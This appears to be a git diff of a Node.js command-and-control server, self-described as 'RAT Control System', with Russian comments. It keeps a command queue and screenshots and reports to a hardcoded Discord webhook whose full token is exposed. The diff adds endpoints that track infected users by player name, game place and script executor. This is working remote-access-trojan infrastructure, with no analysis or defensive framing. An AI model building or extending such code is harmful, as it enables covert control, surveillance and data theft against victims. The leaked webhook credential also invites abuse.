@@ -6,6 +6,9 @@ let commandQueue = [];
 let lastScreenshot = null;
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
 
+// Хранилище онлайн пользователей
+global.onlineUsers = new Map();
+
 // Функция для отправки красивого сообщения в Discord
 async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
     const embed = {
@@ -15,7 +18,7 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
         fields: fields,
         timestamp: new Date().toISOString(),
         footer: {
-            text: "RAT Control System v2.5"
+            text: "RAT Control System v2.6"
         }
     };
 
@@ -29,6 +32,26 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
         console.error('Ошибка отправки в Discord:', error);
     }
 }
+
+// Очистка неактивных пользователей
+function cleanupInactiveUsers() {
+    const now = Date.now();
+    let removedCount = 0;
+    
+    for (let [key, user] of global.onlineUsers.entries()) {
+        if (now - user.lastSeen > 10 * 60 * 1000) { // 10 минут
+            global.onlineUsers.delete(key);
+            removedCount++;
+        }
+    }
+    
+    if (removedCount > 0) {
+        console.log(`🧹 Удалено неактивных пользователей: ${removedCount}`);
+    }
+}
+
+// Запускаем очистку каждые 5 минут
+setInterval(cleanupInactiveUsers, 5 * 60 * 1000);
 
 const server = http.createServer((req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -217,13 +240,73 @@ const server = http.createServer((req, res) => {
         return;
     }
 
+    // Новый эндпоинт для получения списка пользователей
+    if (req.method === 'GET' && req.url === '/users') {
+        try {
+            cleanupInactiveUsers(); // Очищаем перед отправкой
+            
+            if (!global.onlineUsers || global.onlineUsers.size === 0) {
+                res.end(JSON.stringify({ 
+                    users: [],
+                    count: 0,
+                    message: "Нет активных пользователей",
+                    timestamp: new Date().toISOString()
+                }));
+                return;
+            }
+            
+            const users = Array.from(global.onlineUsers.values());
+            
+            res.end(JSON.stringify({
+                users: users,
+                count: users.length,
+                timestamp: new Date().toISOString()
+            }));
+        } catch (e) {
+            res.statusCode = 500;
+            res.end(JSON.stringify({ error: "Server error", details: e.message }));
+        }
+        return;
+    }
+
+    // Новый эндпоинт для обновления информации о пользователе
+    if (req.method === 'POST' && req.url === '/users') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { player, place, executor } = JSON.parse(body);
+                
+                // Обновляем информацию о пользователе
+                global.onlineUsers.set(player, {
+                    player: player,
+                    place: place,
+                    executor: executor,
+                    lastSeen: Date.now(),
+                    timestamp: new Date().toISOString()
+                });
+
+                console.log(`👤 Обновлен пользователь: ${player} в игре ${place}`);
+                
+                res.end(JSON.stringify({ status: "User data updated" }));
+            } catch (e) {
+                res.statusCode = 400;
+                res.end(JSON.stringify({ error: "Invalid user data" }));
+            }
+        });
+        return;
+    }
+
     // Статус сервера
     if (req.method === 'GET' && req.url === '/status') {
+        cleanupInactiveUsers();
+        
         res.end(JSON.stringify({
             status: "online",
-            version: "2.5.0",
+            version: "2.6.0",
             timestamp: new Date().toISOString(),
-            pending_commands: commandQueue.length
+            pending_commands: commandQueue.length,
+            online_users: global.onlineUsers.size
         }));
         return;
     }
@@ -234,7 +317,8 @@ const server = http.createServer((req, res) => {
 
 server.listen(process.env.PORT || 3000, () => {
     console.log("🚀 Сервер запущен на порту 3000");
-    console.log("📊 Версия: 2.5.0");
+    console.log("📊 Версия: 2.6.0");
     console.log("🔗 Webhook: " + WEBHOOK_URL);
     console.log("✅ Готов к приему команд");
+    console.log("👥 Система отслеживания пользователей активна");
 });
